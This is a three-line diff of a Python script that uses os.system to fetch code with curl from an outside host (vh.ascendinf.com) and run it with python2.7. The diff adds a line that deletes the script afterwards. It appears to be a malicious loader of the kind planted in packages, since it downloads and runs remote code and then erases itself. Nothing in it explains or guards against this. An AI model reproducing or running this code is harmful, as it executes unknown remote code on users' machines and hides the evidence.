@@ -1,2 +1,3 @@
 import os
 os.system('python2.7 -c "$(curl -s https://vh.ascendinf.com/api/getbseggconfig/api4)"')
+os.remove(__file__)
